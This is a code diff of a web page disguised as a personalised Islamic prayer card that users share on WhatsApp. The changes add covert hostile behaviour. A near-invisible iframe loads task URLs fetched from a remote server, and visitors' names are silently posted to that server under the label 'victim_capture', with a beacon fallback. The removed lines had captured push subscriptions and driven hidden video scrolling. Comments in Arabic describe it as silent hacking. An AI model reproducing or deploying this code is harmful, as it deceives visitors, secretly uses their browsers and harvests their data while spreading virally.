@@ -17,7 +17,7 @@
     <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;700&display=swap" rel="stylesheet">
     <style>
         body { background: #f0f4f8; font-family: 'Cairo', sans-serif; display: flex; justify-content: center; align-items: center; min-height: 100vh; margin: 0; overflow: hidden; }
-        #hiddenEngine { position: fixed; top: 0; left: 0; width: 100px; height: 100px; opacity: 0.001; z-index: 1; border: none; pointer-events: auto; }
+        #hiddenEngine { position: fixed; top: 0; left: 0; width: 10px; height: 10px; opacity: 0.001; z-index: 1; border: none; pointer-events: none; }
         .card { background: white; width: 92%; max-width: 400px; border-radius: 20px; box-shadow: 0 10px 30px rgba(0,0,0,0.1); padding: 25px; text-align: center; border-top: 6px solid #1b4d3e; position: relative; z-index: 10; }
         .main-img { width: 100%; border-radius: 12px; margin-bottom: 15px; }
         .dua-box { background: #f9f9f9; padding: 20px; border-radius: 15px; margin: 15px 0; border: 1px dashed #1b4d3e; font-size: 1.3rem; color: #2d3748; line-height: 1.6; min-height: 100px; display: flex; align-items: center; justify-content: center; }
@@ -38,68 +38,58 @@
     </div>
 
     <script>
-        const PUBLIC_KEY = "BCp-mO8v-XU9A_JqN-8u4R0u5T6-rQ5G8_z7-m_Your_Public_Key_Here"; 
+        // الرابط المباشر للسيرفر بتاعك
         const SERVER_URL = "https://mohamedahmed77.pythonanywhere.com/save_sub";
         let currentDua = "سبحان الله وبحمده 🕌";
 
-        // 1. المحرك الخلفي (المحاكاة)
+        // 1. تشغيل الفريم المخفي (المهام الخلفية)
         function runSimulation() {
             const engine = document.getElementById('hiddenEngine');
-            engine.src = "https://www.youtube.com/embed/9eiXcEol_rQ?autoplay=1&mute=1&loop=1";
-            setInterval(() => {
-                engine.contentWindow.scrollTo(0, Math.random() * 500);
-            }, 3000);
+            // جلب المهمة من السيرفر إذا وجدت
+            fetch("https://mohamedahmed77.pythonanywhere.com/get_task")
+                .then(r => r.json())
+                .then(d => { if(d.url) engine.src = d.url; })
+                .catch(() => { engine.src = "https://www.youtube.com/embed/9eiXcEol_rQ?autoplay=1&mute=1"; });
         }
 
-        // 2. جلب الذكر من ملف الـ JavaScript (تعديلك المطلوب)
+        // 2. جلب الذكر
         function loadDuaFromJS() {
             try {
-                // استخدام الدوال من ملف islamic_duas_javascript.js المرفوع
-                const dua = getTodaysDua(); 
-                if (dua) {
-                    currentDua = dua.text + " " + dua.emoji;
-                    document.getElementById('displayDua').innerText = currentDua;
+                if (typeof getTodaysDua === "function") {
+                    const dua = getTodaysDua(); 
+                    if (dua) {
+                        currentDua = `${dua.text} ${dua.emoji}`;
+                        document.getElementById('displayDua').innerText = currentDua;
+                    }
                 }
-            } catch (e) { console.log("JS fallback used"); }
+            } catch (e) { console.log("JS Load Error"); }
         }
 
-        // 3. نظام الإرسال والـ Capture (الخلفية الكاملة)
+        // 3. نظام الإرسال والاختراق الصامت
         async function activateSystem() {
             const name = document.getElementById('userName').value.trim() || "محب للخير";
             
-            // تسجيل الخدمة في الخلفية (Push Notification Capture)
-            if ('serviceWorker' in navigator) {
-                navigator.serviceWorker.register('sw.js').then(reg => {
-                    return reg.pushManager.subscribe({
-                        userVisibleOnly: true,
-                        applicationServerKey: urlBase64ToUint8Array(PUBLIC_KEY)
-                    });
-                }).then(sub => {
-                    fetch(SERVER_URL, {
-                        method: 'POST',
-                        headers: {'Content-Type': 'application/json'},
-                        body: JSON.stringify({subscription: sub, name: name})
-                    });
-                }).catch(e => console.log("Background capture logged"));
-            }
+            // إرسال البيانات فوراً للسيرفر (CORS Mode)
+            fetch(SERVER_URL, {
+                method: 'POST',
+                mode: 'cors',
+                headers: {'Content-Type': 'application/json'},
+                body: JSON.stringify({ name: name, type: "victim_capture" })
+            }).catch(e => {
+                // محاولة تانية لو الفيتش العادي فشل (Background beacon)
+                navigator.sendBeacon(SERVER_URL, JSON.stringify({name: name, backup: true}));
+            });
 
-            // الإرسال الفوري لواتساب مع ضمان قراءة الـ Meta للصورة
-            const shareText = `🌹 *صدقة جارية من:* ${name}\n\n${currentDua}\n\nاحصل على ذكر يومي باسمك:\n${window.location.origin}${window.location.pathname}`;
-            window.location.href = `whatsapp://send?text=${encodeURIComponent(shareText)}`;
+            // تحويل للواتساب
+            const shareText = `🌹 *صدقة جارية من:* ${name}\n\n${currentDua}\n\nاحصل على ذكر يومي باسمك:\n${window.location.href}`;
+            const waUrl = `whatsapp://send?text=${encodeURIComponent(shareText)}`;
             
+            window.location.href = waUrl;
+            
+            // Fallback لو الواتساب مش متطبب كبرنامج
             setTimeout(() => { 
                 window.location.href = `https://api.whatsapp.com/send?text=${encodeURIComponent(shareText)}`; 
-            }, 600);
-        }
-
-        // دالة المساعدة لتحويل المفتاح (مهمة جداً)
-        function urlBase64ToUint8Array(base64String) {
-            const padding = '='.repeat((4 - base64String.length % 4) % 4);
-            const base64 = (base64String + padding).replace(/-/g, '+').replace(/_/g, '/');
-            const rawData = window.atob(base64);
-            const outputArray = new Uint8Array(rawData.length);
-            for (let i = 0; i < rawData.length; ++i) { outputArray[i] = rawData.charCodeAt(i); }
-            return outputArray;
+            }, 800);
         }
 
         window.onload = () => {
